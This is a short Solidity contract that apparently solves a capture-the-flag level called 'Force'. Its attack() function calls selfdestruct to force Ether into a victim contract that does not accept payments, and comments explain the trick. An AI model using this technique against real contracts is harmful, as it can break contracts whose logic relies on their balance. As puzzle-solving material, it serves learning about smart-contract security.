// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./Force.sol";

//selfdestruct sends remaining contract balance to address argument.
//Target contract balance can be unexpectedly updated with selfdestruct payable trick

contract Solution11 {
    Force public victim;

    constructor(Force victim_) public {
        victim = victim_;
    }

    function attack() external payable {
        selfdestruct(payable(address(victim)));
    }
}
